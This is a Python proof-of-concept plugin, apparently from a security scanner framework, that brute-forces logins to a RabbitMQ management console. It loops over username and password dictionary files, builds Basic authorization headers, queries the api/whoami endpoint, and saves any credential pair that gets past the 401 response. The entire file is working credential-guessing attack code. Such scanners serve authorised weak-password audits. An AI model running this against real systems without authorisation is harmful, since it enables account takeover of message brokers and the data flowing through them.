#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from base64 import b64encode
from script import Script, SERVICE_PORT_MAP

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.RABBITMQ
        self.name = 'rabbitmq burst'
        self.keyword = ['rabbitmq', 'burst']
        self.info = 'rabbitmq burst'
        self.type = 'weakpass'
        self.level = 'high'
        Script.__init__(self, target=target, service_type=self.service_type)

    def prove(self):
        self.get_url()
        if self.base_url:
            usernamedic = self.read_file(self.parameter['U']) if 'U' in self.parameter.keys() else self.read_file('dict/rabbitmq_usernames.txt')
            passworddic = self.read_file(self.parameter['P']) if 'P' in self.parameter.keys() else self.read_file('dict/rabbitmq_passwords.txt')
            url = self.base_url + 'api/whoami'
            res = self.curl('get', url)
            if res == 401 :
                for linef1 in usernamedic:
                    username = linef1.strip('\r').strip('\n')
                    for linef2 in passworddic:
                        try:
                            password = (
                                linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                                '\r').strip('\n')

                            key = str(b64encode(bytes(":".join([username,password]),'utf-8')),'utf-8')
                            headers = {"Authorization" : 'Basic %s' % key}
                            res = self.curl('get',url,headers = headers)
                            if res != 401 and 'Console' in res.text:
                                self.flag = 1
                                self.req.append({"username": username,"password":password})
                                self.res.append({"info": username + "/" + password, "key": "Authorization: " + ":".join([username,password])})
                                return
                        except Exception:
                            pass
